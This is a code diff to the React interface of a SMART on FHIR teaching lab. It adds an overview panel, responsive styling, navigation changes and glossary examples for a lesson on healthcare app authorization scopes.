             <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-3 sm:pt-4 flex flex-col gap-2 sm:gap-3">
               <div className="flex items-center justify-between gap-4">
                 <div className="flex items-center gap-3 min-w-0">
-                  <div className="w-9 h-9 rounded-lg bg-indigo-600 flex items-center justify-center shrink-0" aria-hidden="true">
+                  <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-lg bg-indigo-600 flex items-center justify-center shrink-0" aria-hidden="true">
                     <ShieldCheck className="w-5 h-5 text-white" />
                   </div>
                   <div className="min-w-0">
-                    <h1 className="font-head text-xl sm:text-2xl font-semibold text-white leading-tight">
+                    <h1 className="font-head text-lg sm:text-2xl font-semibold text-white leading-tight">
                       SMART on FHIR Interactive Lab
                     </h1>
                     <p className="text-sm text-slate-400 hidden sm:block">
@@ -2182,14 +2241,14 @@
                   type="button"
                   onClick={openGlossary}
                   aria-haspopup="dialog"
-                  className="inline-flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-semibold bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-700 transition shrink-0"
+                  className="inline-flex items-center gap-1.5 sm:gap-2 px-2.5 py-1.5 sm:px-3 sm:py-2 rounded-lg text-sm font-semibold bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-700 transition shrink-0"
                 >
                   <BookMarked className="w-4 h-4" />
                   <span>Glossary</span>
                 </button>
               </div>
 
-              <nav role="tablist" aria-label="Lab sections" className="flex gap-1 overflow-x-auto -mb-px">
+              <nav role="tablist" aria-label="Lab sections" className="no-scrollbar flex gap-1 overflow-x-auto -mb-px">
                 {TABS.map((tab, i) => {
                   const isActive = activeTab === tab.id;
                   return (
@@ -2201,7 +2260,7 @@
                       aria-selected={isActive}
                       aria-controls={"panel-" + tab.id}
                       onClick={() => setActiveTab(tab.id)}
-                      className={"tab-btn px-3 py-2.5 text-sm font-semibold border-b-2 whitespace-nowrap " + (
+                      className={"tab-btn px-2.5 sm:px-3 py-2 sm:py-2.5 text-sm font-semibold border-b-2 whitespace-nowrap " + (
                         isActive
                           ? "border-sky-300 text-sky-300"
                           : "border-transparent text-slate-400 hover:text-white"
@@ -2222,9 +2281,21 @@
                   <span className="text-sm text-slate-400 hidden md:inline shrink-0">
                     Steps done: <span className="tabular-nums font-semibold text-slate-200">{completedSteps.length} of {LAB_STEPS.length}</span>
                   </span>
-                  <div className="flex items-center gap-1.5 overflow-x-auto">
+                  <div className="no-scrollbar flex items-center gap-1.5 overflow-x-auto">
+                    <button
+                      type="button"
+                      onClick={() => setLabOverview(true)}
+                      aria-current={labOverview ? "step" : undefined}
+                      className={"px-2 sm:px-2.5 py-0.5 sm:py-1 rounded-md text-xs sm:text-sm font-semibold transition shrink-0 border " + (
+                        labOverview
+                          ? "bg-sky-500 text-white border-sky-500"
+                          : "bg-slate-900 text-slate-400 border-slate-700 hover:bg-slate-800"
+                      )}
+                    >
+                      Overview
+                    </button>
                     {LAB_STEPS.map((step, idx) => {
-                      const isCurrent = idx === currentStepIndex;
+                      const isCurrent = !labOverview && idx === currentStepIndex;
                       const isDone = completedSteps.includes(step.id);
                       return (
                         <button
@@ -2233,7 +2304,7 @@
                           onClick={() => goToStep(idx)}
                           title={"Step " + step.id + ": " + step.title}
                           aria-current={isCurrent ? "step" : undefined}
-                          className={"min-w-[2.25rem] px-2 py-1 rounded-md text-sm font-semibold tabular-nums transition flex items-center justify-center gap-1 shrink-0 border " + (
+                          className={"min-w-[1.9rem] sm:min-w-[2.25rem] px-1.5 sm:px-2 py-0.5 sm:py-1 rounded-md text-xs sm:text-sm font-semibold tabular-nums transition flex items-center justify-center gap-1 shrink-0 border " + (
                             isCurrent
                               ? "bg-sky-500 text-white border-sky-500"
                               : isDone
@@ -2432,14 +2503,15 @@
                           {rich(activeVideo.coreTakeaway)}
                         </div>
 
-                        <p className="text-sm sm:text-sm text-slate-300 leading-relaxed">
-                          {rich(activeVideo.summary)}
-                        </p>
+                        <div className="space-y-3">
+                          <h3 className="text-lg font-semibold text-white">In plain words</h3>
+                          {activeVideo.plain.map((para, i) => (
+                            <p key={i} className="text-base text-slate-300 leading-relaxed">{rich(para, true)}</p>
+                          ))}
+                        </div>
 
                         <div className="space-y-2 pt-2">
-                          <div className="text-xs font-bold text-slate-400">
-                            Key Architectural Takeaways:
-                          </div>
+                          <h3 className="text-lg font-semibold text-white">Key takeaways</h3>
                           {activeVideo.connections.map((conn, i) => (
                             <div
                               key={i}
@@ -2450,6 +2522,10 @@
                             </div>
                           ))}
                         </div>
+
+                        <p className="text-sm text-slate-400 leading-relaxed">
+                          <span className="font-semibold text-slate-300">In the video: </span>{rich(activeVideo.summary)}
+                        </p>
                       </div>
 
                       <div className="pt-4 border-t border-slate-800 flex items-center justify-between">
@@ -2797,7 +2873,64 @@
           {/* GUIDED LAB: ten steps beside the live discovery JSON */}
           {activeTab === "walkthrough" && (
             <main role="tabpanel" id="panel-walkthrough" aria-labelledby="tab-walkthrough" className="tab-panel max-w-7xl w-full mx-auto flex-1 grid grid-cols-1 lg:grid-cols-12 gap-6 p-4 sm:p-6">
-              <section className="lg:col-span-7 flex flex-col justify-between bg-slate-900/70 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-sm">
+              <section id="guided-step" className="lg:col-span-7 flex flex-col justify-between bg-slate-900/70 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-sm">
+                {labOverview && (
+                  <div className="space-y-7">
+                    <div className="border-b border-slate-800 pb-4">
+                      <h2 className="text-xl sm:text-2xl font-bold text-white tracking-tight">Before you start: how this lab works</h2>
+                      <p className="text-slate-300 mt-2 leading-relaxed">
+                        Every SMART server publishes a settings file that tells apps how to connect and what they may ask for.
+                        In ten short steps you will read a realistic one, shown <span className="hidden lg:inline">on the right</span><span className="lg:hidden">below the steps</span>, and learn what each part means for John&rsquo;s app.
+                      </p>
+                    </div>
+
+                    <section className="space-y-3">
+                      <h3 className="text-lg font-semibold text-white">The big picture</h3>
+                      <ol className="space-y-3 list-decimal pl-5 marker:text-slate-500 text-slate-300 leading-relaxed">
+                        <li><span className="font-semibold text-white">Find the server&rsquo;s rules (steps 1&ndash;5).</span> An app first reads the settings file to learn where people sign in, where it collects tokens, and what the server supports.</li>
+                        <li><span className="font-semibold text-white">Ask only for what is needed (steps 6&ndash;8).</span> Permissions are written as scopes, such as <code className="code-inline">patient/Observation.rs</code>. You will learn to read one and to choose the smallest one that works.</li>
+                        <li><span className="font-semibold text-white">Keep people and permissions straight (steps 9&ndash;10).</span> The person signed in is not always the patient, and a scope the server offers is not one the app has been given.</li>
+                      </ol>
+                    </section>
+
+                    <section className="space-y-3">
+                      <h3 className="text-lg font-semibold text-white">The ten steps</h3>
+                      {Array.from(new Set(LAB_STEPS.map((s) => s.taskBadge.split(" \u2022 ")[0]))).map((part) => (
+                        <div key={part} className="space-y-1">
+                          <div className="text-sm font-semibold text-slate-400">{part}</div>
+                          {LAB_STEPS.map((step, idx) => ({ step, idx }))
+                            .filter(({ step }) => step.taskBadge.split(" \u2022 ")[0] === part)
+                            .map(({ step, idx }) => (
+                              <button
+                                key={step.id}
+                                type="button"
+                                onClick={() => goToStep(idx)}
+                                className="w-full text-left flex gap-3 items-baseline rounded-lg px-3 py-2 -mx-3 hover:bg-slate-800/60 transition"
+                              >
+                                <span className="tabular-nums font-semibold text-sky-300 w-5 shrink-0">{step.id}</span>
+                                <span className="min-w-0">
+                                  <span className="font-semibold text-white">{step.title}</span>
+                                  {completedSteps.includes(step.id) && <Check className="inline w-3.5 h-3.5 ml-1.5 text-emerald-300" />}
+                                  <span className="block text-sm text-slate-400">{step.subtitle}</span>
+                                </span>
+                              </button>
+                            ))}
+                        </div>
+                      ))}
+                    </section>
+
+                    <section className="space-y-3">
+                      <h3 className="text-lg font-semibold text-white">How each step works</h3>
+                      <ul className="space-y-2 text-slate-300 leading-relaxed">
+                        <li><span className="font-semibold text-white">Read.</span> A short explanation, with the core idea in a box at the top.</li>
+                        <li><span className="font-semibold text-white">Try it.</span> A button, toggle or picker that changes what you see.</li>
+                        <li><span className="font-semibold text-white">Look at the file.</span> The settings file highlights the lines the step is about.</li>
+                        <li><span className="font-semibold text-white">Check yourself.</span> Several steps end with a quick question, and step 10 leads to a 10-question final assessment.</li>
+                      </ul>
+                    </section>
+                  </div>
+                )}
+                {!labOverview && (
                 <div className="space-y-6">
                   {/* Step Header */}
                   <div className="border-b border-slate-800 pb-4">
@@ -2811,6 +2944,9 @@
                       {currentStep.title}
                     </h2>
                     <p className="text-sm text-slate-400 mt-1">{currentStep.subtitle}</p>
+                    <a href="#discovery-file" className="lg:hidden inline-block mt-2 text-sm font-semibold text-sky-300 underline underline-offset-2">
+                      See the highlighted lines in the settings file &darr;
+                    </a>
 
                     {currentStep.videoTakeaway && (
                       <div className="mt-3 p-3 rounded-xl bg-indigo-950/40 border border-indigo-500/30 flex items-start justify-between gap-3">
@@ -3664,47 +3800,52 @@
                     </div>
                   )}
                 </div>
+                )}
 
                 {/* Step Navigation Bar */}
-                <div className="pt-6 mt-6 border-t border-slate-800 flex items-center justify-between">
+                <div className="pt-6 mt-6 border-t border-slate-800 flex items-center justify-between gap-2">
                   <button
+                    type="button"
                     onClick={handlePrev}
-                    disabled={currentStepIndex === 0}
-                    className={`px-4 py-2 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition ${
-                      currentStepIndex === 0
-                        ? "bg-slate-900 text-slate-600 cursor-not-allowed"
+                    disabled={labOverview}
+                    className={"px-3 sm:px-4 py-2 rounded-xl text-sm font-semibold flex items-center gap-1.5 transition whitespace-nowrap " + (
+                      labOverview
+                        ? "bg-slate-900 text-slate-500 cursor-not-allowed"
                         : "bg-slate-800 hover:bg-slate-700 text-slate-200"
-                    }`}
+                    )}
                   >
                     <ArrowLeft className="w-4 h-4" />
-                    <span>Previous Step</span>
+                    <span className="sm:hidden">Back</span>
+                    <span className="hidden sm:inline">{!labOverview && currentStepIndex === 0 ? "Overview" : "Previous step"}</span>
                   </button>
 
-                  <div className="text-xs text-slate-400">
-                    Step <span className="text-white font-bold">{currentStep.id}</span> of{" "}
-                    {LAB_STEPS.length}
+                  <div className="text-sm text-slate-400 whitespace-nowrap">
+                    {labOverview ? "Overview" : <>Step <span className="text-white font-bold">{currentStep.id}</span> of {LAB_STEPS.length}</>}
                   </div>
 
                   <button
+                    type="button"
                     onClick={handleNext}
-                    disabled={currentStepIndex === LAB_STEPS.length - 1}
-                    className={`px-4 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 transition ${
-                      currentStepIndex === LAB_STEPS.length - 1
+                    disabled={!labOverview && currentStepIndex === LAB_STEPS.length - 1}
+                    className={"px-3 sm:px-4 py-2 rounded-xl text-sm font-bold flex items-center gap-1.5 transition whitespace-nowrap " + (
+                      !labOverview && currentStepIndex === LAB_STEPS.length - 1
                         ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 cursor-default"
-                        : "bg-sky-500 hover:bg-sky-400 text-slate-950 shadow-sm"
-                    }`}
+                        : "bg-sky-500 hover:bg-sky-600 text-white shadow-sm"
+                    )}
                   >
-                    {currentStepIndex === LAB_STEPS.length - 1 ? (
-                      <><CheckCircle2 className="w-4 h-4" /><span>Lab Complete!</span></>
+                    {labOverview ? (
+                      <><span>Start step 1</span><ArrowRight className="w-4 h-4" /></>
+                    ) : currentStepIndex === LAB_STEPS.length - 1 ? (
+                      <><CheckCircle2 className="w-4 h-4" /><span>Lab complete</span></>
                     ) : (
-                      <><span>Next Step</span><ArrowRight className="w-4 h-4" /></>
+                      <><span className="sm:hidden">Next</span><span className="hidden sm:inline">Next step</span><ArrowRight className="w-4 h-4" /></>
                     )}
                   </button>
                 </div>
               </section>
 
               {/* RIGHT PANEL: Live SMART Discovery JSON Inspector */}
-              <aside className="lg:col-span-5 flex flex-col bg-slate-900/70 border border-slate-800 rounded-2xl overflow-hidden shadow-sm">
+              <aside id="discovery-file" className="lg:col-span-5 flex flex-col bg-slate-900/70 border border-slate-800 rounded-2xl overflow-hidden shadow-sm">
                 <div className="p-4 border-b border-slate-800 bg-slate-950/60 space-y-3">
                   <div className="flex items-center justify-between gap-2">
                     <div className="flex items-center gap-2">
@@ -4100,7 +4241,8 @@
                 </div>
 
                 {/* How to read the diagram */}
-                <ul className="flex flex-col lg:flex-row gap-x-8 gap-y-1.5 text-sm text-slate-400">
+                <OpenOnDesktop summary="How to read this diagram">
+                <ul className="grid gap-2 lg:grid-cols-2 text-sm text-slate-400 leading-relaxed">
                   <li>Each row is one message. The line runs from the sender&rsquo;s column to the receiver&rsquo;s, and the arrowhead points at the receiver.</li>
                   <li className="flex items-start gap-2">
                     <span className="mt-1.5 w-3 h-3 rounded-full bg-amber-400 border border-slate-50/40 shrink-0" aria-hidden="true" />
@@ -4113,6 +4255,7 @@
                     <a href="https://fhir.epic.com/Documentation?docId=oauth2tutorial&amp;section=testing-a-standalone-launch" className="text-sky-300 underline underline-offset-2 hover:text-sky-200" target="_blank" rel="noopener noreferrer">See Epic&rsquo;s diagrams</a>
                   </li>
                 </ul>
+                </OpenOnDesktop>
 
                 <div className="overflow-x-auto">
                   <div className="min-w-[680px] space-y-2">
@@ -6861,6 +7004,12 @@ Content-Type: application/json
                         <p className="text-slate-300 leading-relaxed text-sm">
                           {rich(item.def)}
                         </p>
+                        {item.example && (
+                          <div className="code-island rounded-lg border px-3 py-2 mt-2 overflow-x-auto">
+                            <span className="code-label">What it looks like</span>
+                            <pre className="text-xs text-slate-200 leading-relaxed whitespace-pre-wrap break-all">{item.example}</pre>
+                          </div>
+                        )}
                       </div>
                     ))
                   )}
